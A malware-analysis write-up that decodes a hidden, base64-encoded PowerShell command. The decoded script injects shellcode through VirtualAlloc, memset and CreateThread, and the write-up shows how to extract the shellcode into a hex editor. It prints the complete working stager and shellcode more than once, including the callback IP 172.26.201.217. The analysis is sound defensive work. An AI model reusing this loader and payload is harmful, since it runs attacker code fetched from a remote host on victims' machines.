# Reverse Engineering a Encoded Powershell Containing Raw Shellcode Write-up

In this write-up I will be starting with an encoded powershell execution and finding what IP it is reaching out to, what port it is using, and the payload used in the shellcode. 

## Decoding the Powershell

```ps
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoE -NoP -NonI -W Hidden -E JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAGMAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAcwBjACAAPQAgADAAeABmAGMALAAwAHgAZQA4ACwAMAB4ADgAZgAsADAAeAAwADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA2ADAALAAwAHgAOAA5ACwAMAB4AGUANQAsADAAeAAzADEALAAwAHgAZAAyACwAMAB4ADYANAAsADAAeAA4AGIALAAwAHgANQAyACwAMAB4ADMAMAAsADAAeAA4AGIALAAwAHgANQAyACwAMAB4ADAAYwAsADAAeAA4AGIALAAwAHgANQAyACwAMAB4ADEANAAsADAAeAAwAGYALAAwAHgAYgA3ACwAMAB4ADQAYQAsADAAeAAyADYALAAwAHgAOABiACwAMAB4ADcAMgAsADAAeAAyADgALAAwAHgAMwAxACwAMAB4AGYAZgAsADAAeAAzADEALAAwAHgAYwAwACwAMAB4AGEAYwAsADAAeAAzAGMALAAwAHgANgAxACwAMAB4ADcAYwAsADAAeAAwADIALAAwAHgAMgBjACwAMAB4ADIAMAAsADAAeABjADEALAAwAHgAYwBmACwAMAB4ADAAZAAsADAAeAAwADEALAAwAHgAYwA3ACwAMAB4ADQAOQAsADAAeAA3ADUALAAwAHgAZQBmACwAMAB4ADUAMgAsADAAeAA4AGIALAAwAHgANQAyACwAMAB4ADEAMAAsADAAeAA1ADcALAAwAHgAOABiACwAMAB4ADQAMgAsADAAeAAzAGMALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA4AGIALAAwAHgANAAwACwAMAB4ADcAOAAsADAAeAA4ADUALAAwAHgAYwAwACwAMAB4ADcANAAsADAAeAA0AGMALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA4AGIALAAwAHgANQA4ACwAMAB4ADIAMAAsADAAeAAwADEALAAwAHgAZAAzACwAMAB4ADgAYgAsADAAeAA0ADgALAAwAHgAMQA4ACwAMAB4ADUAMAAsADAAeAA4ADUALAAwAHgAYwA5ACwAMAB4ADcANAAsADAAeAAzAGMALAAwAHgAMwAxACwAMAB4AGYAZgAsADAAeAA0ADkALAAwAHgAOABiACwAMAB4ADMANAAsADAAeAA4AGIALAAwAHgAMAAxACwAMAB4AGQANgAsADAAeAAzADEALAAwAHgAYwAwACwAMAB4AGMAMQAsADAAeABjAGYALAAwAHgAMABkACwAMAB4AGEAYwAsADAAeAAwADEALAAwAHgAYwA3ACwAMAB4ADMAOAAsADAAeABlADAALAAwAHgANwA1ACwAMAB4AGYANAAsADAAeAAwADMALAAwAHgANwBkACwAMAB4AGYAOAAsADAAeAAzAGIALAAwAHgANwBkACwAMAB4ADIANAAsADAAeAA3ADUALAAwAHgAZQAwACwAMAB4ADUAOAAsADAAeAA4AGIALAAwAHgANQA4ACwAMAB4ADIANAAsADAAeAAwADEALAAwAHgAZAAzACwAMAB4ADYANgAsADAAeAA4AGIALAAwAHgAMABjACwAMAB4ADQAYgAsADAAeAA4AGIALAAwAHgANQA4ACwAMAB4ADEAYwAsADAAeAAwADEALAAwAHgAZAAzACwAMAB4ADgAYgAsADAAeAAwADQALAAwAHgAOABiACwAMAB4ADAAMQAsADAAeABkADAALAAwAHgAOAA5ACwAMAB4ADQANAAsADAAeAAyADQALAAwAHgAMgA0ACwAMAB4ADUAYgAsADAAeAA1AGIALAAwAHgANgAxACwAMAB4ADUAOQAsADAAeAA1AGEALAAwAHgANQAxACwAMAB4AGYAZgAsADAAeABlADAALAAwAHgANQA4ACwAMAB4ADUAZgAsADAAeAA1AGEALAAwAHgAOABiACwAMAB4ADEAMgAsADAAeABlADkALAAwAHgAOAAwACwAMAB4AGYAZgAsADAAeABmAGYALAAwAHgAZgBmACwAMAB4ADUAZAAsADAAeAA2ADgALAAwAHgANgBlACwAMAB4ADYANQAsADAAeAA3ADQALAAwAHgAMAAwACwAMAB4ADYAOAAsADAAeAA3ADcALAAwAHgANgA5ACwAMAB4ADYAZQAsADAAeAA2ADkALAAwAHgANQA0ACwAMAB4ADYAOAAsADAAeAA0AGMALAAwAHgANwA3ACwAMAB4ADIANgAsADAAeAAwADcALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAAzADEALAAwAHgAZABiACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgANgA4ACwAMAB4ADMAYQAsADAAeAA1ADYALAAwAHgANwA5ACwAMAB4AGEANwAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgANgBhACwAMAB4ADAAMwAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADYAOAAsADAAeABmAGIALAAwAHgAMgAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgAZQA4ACwAMAB4AGIAMAAsADAAeAAwADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAyAGYALAAwAHgANwAxACwAMAB4ADYAMwAsADAAeAA1ADcALAAwAHgANABiACwAMAB4ADYAOQAsADAAeAAzADUALAAwAHgAMwAwACwAMAB4ADMANAAsADAAeAA2ADYALAAwAHgAMwAxACwAMAB4ADcANgAsADAAeAA1AGYALAAwAHgANQAzACwAMAB4ADYANgAsADAAeAAzADUALAAwAHgANAA5ACwAMAB4ADYAZQAsADAAeAAzADYALAAwAHgAMwA3ACwAMAB4ADUANAAsADAAeAA1ADAALAAwAHgANgA3ACwAMAB4ADcANgAsADAAeAA3ADQALAAwAHgANQA0ACwAMAB4ADMAMwAsADAAeAA1ADEALAAwAHgANQA3ACwAMAB4ADQAMgAsADAAeAAwADAALAAwAHgANQAwACwAMAB4ADYAOAAsADAAeAA1ADcALAAwAHgAOAA5ACwAMAB4ADkAZgAsADAAeABjADYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA4ADkALAAwAHgAYwA2ACwAMAB4ADUAMwAsADAAeAA2ADgALAAwAHgAMAAwACwAMAB4ADMAMgAsADAAeABlADgALAAwAHgAOAA0ACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADUANwAsADAAeAA1ADMALAAwAHgANQA2ACwAMAB4ADYAOAAsADAAeABlAGIALAAwAHgANQA1ACwAMAB4ADIAZQAsADAAeAAzAGIALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA5ADYALAAwAHgANgBhACwAMAB4ADAAYQAsADAAeAA1AGYALAAwAHgANgA4ACwAMAB4ADgAMAAsADAAeAAzADMALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA4ADkALAAwAHgAZQAwACwAMAB4ADYAYQAsADAAeAAwADQALAAwAHgANQAwACwAMAB4ADYAYQAsADAAeAAxAGYALAAwAHgANQA2ACwAMAB4ADYAOAAsADAAeAA3ADUALAAwAHgANAA2ACwAMAB4ADkAZQAsADAAeAA4ADYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgANQA2ACwAMAB4ADYAOAAsADAAeAAyAGQALAAwAHgAMAA2ACwAMAB4ADEAOAAsADAAeAA3AGIALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA4ADUALAAwAHgAYwAwACwAMAB4ADcANQAsADAAeAAxADYALAAwAHgANgA4ACwAMAB4ADgAOAAsADAAeAAxADMALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANAA0ACwAMAB4AGYAMAAsADAAeAAzADUALAAwAHgAZQAwACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgANABmACwAMAB4ADcANQAsADAAeABjAGQALAAwAHgANgA4ACwAMAB4AGYAMAAsADAAeABiADUALAAwAHgAYQAyACwAMAB4ADUANgAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADYAYQAsADAAeAA0ADAALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAAxADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA0ADAALAAwAHgAMAAwACwAMAB4ADUAMwAsADAAeAA2ADgALAAwAHgANQA4ACwAMAB4AGEANAAsADAAeAA1ADMALAAwAHgAZQA1ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOQAzACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgAOAA5ACwAMAB4AGUANwAsADAAeAA1ADcALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAAyADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA1ADMALAAwAHgANQA2ACwAMAB4ADYAOAAsADAAeAAxADIALAAwAHgAOQA2ACwAMAB4ADgAOQAsADAAeABlADIALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA4ADUALAAwAHgAYwAwACwAMAB4ADcANAAsADAAeABjAGQALAAwAHgAOABiACwAMAB4ADAANwAsADAAeAAwADEALAAwAHgAYwAzACwAMAB4ADgANQAsADAAeABjADAALAAwAHgANwA1ACwAMAB4AGUANQAsADAAeAA1ADgALAAwAHgAYwAzACwAMAB4ADUAZgAsADAAeABlADgALAAwAHgANgA5ACwAMAB4AGYAZgAsADAAeABmAGYALAAwAHgAZgBmACwAMAB4ADMAMQAsADAAeAAzADcALAAwAHgAMwAyACwAMAB4ADIAZQAsADAAeAAzADIALAAwAHgAMwA2ACwAMAB4ADIAZQAsADAAeAAzADIALAAwAHgAMwAwACwAMAB4ADMAMQAsADAAeAAyAGUALAAwAHgAMwAyACwAMAB4ADMAMQAsADAAeAAzADcALAAwAHgAMAAwADsAJABzAGkAegBlACAAPQAgADAAeAAxADAAMAAwADsAaQBmACAAKAAkAHMAYwAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwAHgAMQAwADAAMAApAHsAJABzAGkAegBlACAAPQAgACQAcwBjAC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAHMAaQB6AGUALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHMAYwAuAEwAZQBuAGcAdABoAC0AMQApADsAJABpACsAKwApACAAewAkAHcAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJAB4AC4AVABvAEkAbgB0ADMAMgAoACkAKwAkAGkAKQAsACAAJABzAGMAWwAkAGkAXQAsACAAMQApAH0AOwAkAHcAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAMAAsADAALAAkAHgALAAwACwAMAAsADAAKQA7AGYAbwByACAAKAA7ADsAKQB7AFMAdABhAHIAdAAtAHMAbABlAGUAcAAgADYAMAB9ADsAJwA7ACQAZwBxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkADEAKQApADsAaQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA4ACkAewAkAHgAOAA2ACAAPQAgACQAZQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0ACAAKwAgACIAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABjAG0AZAAgAD0AIAAiAC0AbgBvAHAAIAAtAG4AbwBuAGkAIAAtAGUAbgBjACAAIgA7AGkAZQB4ACAAIgAmACAAJAB4ADgANgAgACQAYwBtAGQAIAAkAGcAcQAiAH0AZQBsAHMAZQB7ACQAYwBtAGQAIAA9ACAAIgAtAG4AbwBwACAALQBuAG8AbgBpACAALQBlAG4AYwAiADsAaQBlAHgAIAAiACYAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAJABjAG0AZAAgACQAZwBxACIAOwB9AA==
```

**Arguments used:**

* -NoE : NoExit (This prevents powershell from closing after the command has been ran)
* -NoP : NoProfile (This prevents interference from loading profile scripts by preventing them)
* -NonI : NonInteractive (Common with shellcode, blocks interactive usage from the user)
* -W Hidden : WindowStyle (Combined with NonI, makes it so only the adversary can communicate with this hidden powershell)
* -E : EncodedCommand (This is an acronym for encoding the powershell in base64)

Note that these are all acronyms for longer flags and there are multiple options to use. There are also other common arguments that weren't used in this case but can be found in the below resource.

Here's a nice [resource](https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/) on powershell attacks, I highly recommend reading through it.

**Decoded from base64**

We can tell this is encoded with base64 due to the padding at the end ==

There are many [resources](base64decode.org) for decoding base64.

You can also use the command line in linux.

```
base64 --decode encpowershellafterthe-e.txt
```

**Decoded powershell:**

```ps
$1 = '$c = ''[DllImport("kernel32.dll")]
public static extern IntPtr 
VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';
$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x8b,0x72,0x28,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x01,0xd3,0x8b,0x48,0x18,0x50,0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xfb,0x20,0x00,0x00,0xe8,0xb0,0x00,0x00,0x00,0x2f,0x71,0x63,0x57,0x4b,0x69,0x35,0x30,0x34,0x66,0x31,0x76,0x5f,0x53,0x66,0x35,0x49,0x6e,0x36,0x37,0x54,0x50,0x67,0x76,0x74,0x54,0x33,0x51,0x57,0x42,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x16,0x68,0x88,0x13,0x00,0x00,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x69,0xff,0xff,0xff,0x31,0x37,0x32,0x2e,0x32,0x36,0x2e,0x32,0x30,0x31,0x2e,0x32,0x31,0x37,0x00;
$size = 0x1000;
if ($sc.Length -gt 0x1000)
{$size = $sc.Length};
$x=$w::VirtualAlloc(0,0x1000,$size,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++)
{$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
$w::CreateThread(0,0,$x,0,0,0);
for (;;)
{Start-sleep 60};';
$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));
if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";
$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}
else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}
```

Now that we have the powershell used, we can tell that they are attempting to inject their shellcode by calling 3 functions. They use the function VirtualAlloc() to create memory for the shellcode, then using memset() to copy in the shellcode, and finally creating a thread with CreateThread() to execute the shellcode after a 60 second sleep.

## Shellcode

**We can see the raw 32 bit shellcode provided in the powershell:**

```ps
[Byte[]]$sc = 0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x8b,0x72,0x28,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x01,0xd3,0x8b,0x48,0x18,0x50,0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xfb,0x20,0x00,0x00,0xe8,0xb0,0x00,0x00,0x00,0x2f,0x71,0x63,0x57,0x4b,0x69,0x35,0x30,0x34,0x66,0x31,0x76,0x5f,0x53,0x66,0x35,0x49,0x6e,0x36,0x37,0x54,0x50,0x67,0x76,0x74,0x54,0x33,0x51,0x57,0x42,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x16,0x68,0x88,0x13,0x00,0x00,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x69,0xff,0xff,0xff,0x31,0x37,0x32,0x2e,0x32,0x36,0x2e,0x32,0x30,0x31,0x2e,0x32,0x31,0x37,0x00;
```

We can see the storing of the raw bytes shellcode in the variable $sc (**S**hell **C**ode).

In order to get the hex, we must modify the code a bit to put it into a hex editor.

**We must remove '0x' and ',' from the code:**

Here's a python script I wrote that will clean the hex up, you can execute it and output to a file you will open in [WxHexEditor](https://sourceforge.net/projects/wxhexeditor/):

```py
hexx = "0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x8b,0x72,0x28,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x01,0xd3,0x8b,0x48,0x18,0x50,0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xfb,0x20,0x00,0x00,0xe8,0xb0,0x00,0x00,0x00,0x2f,0x71,0x63,0x57,0x4b,0x69,0x35,0x30,0x34,0x66,0x31,0x76,0x5f,0x53,0x66,0x35,0x49,0x6e,0x36,0x37,0x54,0x50,0x67,0x76,0x74,0x54,0x33,0x51,0x57,0x42,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x16,0x68,0x88,0x13,0x00,0x00,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x69,0xff,0xff,0xff,0x31,0x37,0x32,0x2e,0x32,0x36,0x2e,0x32,0x30,0x31,0x2e,0x32,0x31,0x37,0x00"

chex_str = hexx.replace("0x", "")
final_str = chex_str.replace(',', '')

print(final_str)
```

Now that we cleaned up the shellcode's hex, we can open it in Wx or any other hex editor you prefer:

```hex
FC E8 8F 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 0F B7 4A 26 8B 72 28 31 FF 31 C0 AC 3C 61 7C 02 2C 20 C1 CF 0D 01 C7 49 75 EF 52 8B 52 10 57 8B 42 3C 01 D0 8B 40 78 85 C0 74 4C 01 D0 8B 58 20 01 D3 8B 48 18 50 85 C9 74 3C 31 FF 49 8B 34 8B 01 D6 31 C0 C1 CF 0D AC 01 C7 38 E0 75 F4 03 7D F8 3B 7D 24 75 E0 58 8B 58 24 01 D3 66 8B 0C 4B 8B 58 1C 01 D3 8B 04 8B 01 D0 89 44 24 24 5B 5B 61 59 5A 51 FF E0 58 5F 5A 8B 12 E9 80 FF FF FF 5D 68 6E 65 74 00 68 77 69 6E 69 54 68 4C 77 26 07 FF D5 31 DB 53 53 53 53 53 68 3A 56 79 A7 FF D5 53 53 6A 03 53 53 68 FB 20 00 00 E8 B0 00 00 00 2F 71 63 57 4B 69 35 30 34 66 31 76 5F 53 66 35 49 6E 36 37 54 50 67 76 74 54 33 51 57 42 00 50 68 57 89 9F C6 FF D5 89 C6 53 68 00 32 E8 84 53 53 53 57 53 56 68 EB 55 2E 3B FF D5 96 6A 0A 5F 68 80 33 00 00 89 E0 6A 04 50 6A 1F 56 68 75 46 9E 86 FF D5 53 53 53 53 56 68 2D 06 18 7B FF D5 85 C0 75 16 68 88 13 00 00 68 44 F0 35 E0 FF D5 4F 75 CD 68 F0 